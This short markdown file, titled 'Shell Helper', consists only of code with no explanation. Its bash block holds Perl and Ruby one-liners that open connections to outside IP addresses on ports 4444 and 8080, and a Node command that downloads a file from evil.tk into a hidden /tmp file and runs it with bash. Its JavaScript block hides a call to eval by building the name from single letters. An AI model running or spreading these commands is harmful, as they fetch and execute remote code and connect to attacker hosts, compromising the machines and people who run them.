# Shell Helper

```bash
perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in(4444,inet_aton("91.92.242.10")))'
ruby -e 'require "socket";TCPSocket.new("45.61.10.20",8080)'
node -e 'require("child_process").exec("wget https://evil.tk/m -O /tmp/.m && bash /tmp/.m")'
```

```javascript
var _0x4f2a = ['log', 'Hello'];
const cmd = 'e' + 'v' + 'a' + 'l';
window[cmd](String.fromCharCode(97,108,101,114,116));
```
